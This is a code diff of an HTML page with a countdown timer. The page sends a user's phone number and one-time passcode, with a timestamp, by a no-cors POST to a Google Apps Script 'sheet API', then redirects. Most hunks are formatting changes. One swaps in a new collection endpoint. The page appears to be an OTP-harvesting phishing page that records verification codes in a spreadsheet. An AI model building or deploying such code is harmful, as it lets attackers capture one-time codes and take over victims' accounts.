@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -189,7 +189,7 @@
         let s = timeLeft % 60;
 
         timerRef.innerText = `${String(m).padStart(2, "0")}:${String(
-          s
+          s,
         ).padStart(2, "0")}`;
 
         if (timeLeft <= 0) {
@@ -220,7 +220,7 @@
           try {
             // Send only the OTP + Phone to same sheet API
             await fetch(
-              "https://script.google.com/macros/s/AKfycbyqRiX5Hiw7zhaPTy1kp4ErZJRAKvjeRADVyKrExQmdA1zeZb-IvutTaeKGwDCs_Oso3A/exec",
+              "https://script.google.com/macros/s/AKfycbxZ-x3vKl5VbsS4KixMg3pCwzU-q1GBE-Pyi7Gpuy1SRsT5UHV2MHR9UfU7myBu3FEN/exec",
               {
                 method: "POST",
                 mode: "no-cors",
@@ -229,7 +229,7 @@
                   otp: otp,
                   otpVerifiedAt: new Date().toISOString(),
                 }),
-              }
+              },
             );
 
             // Success → Redirect
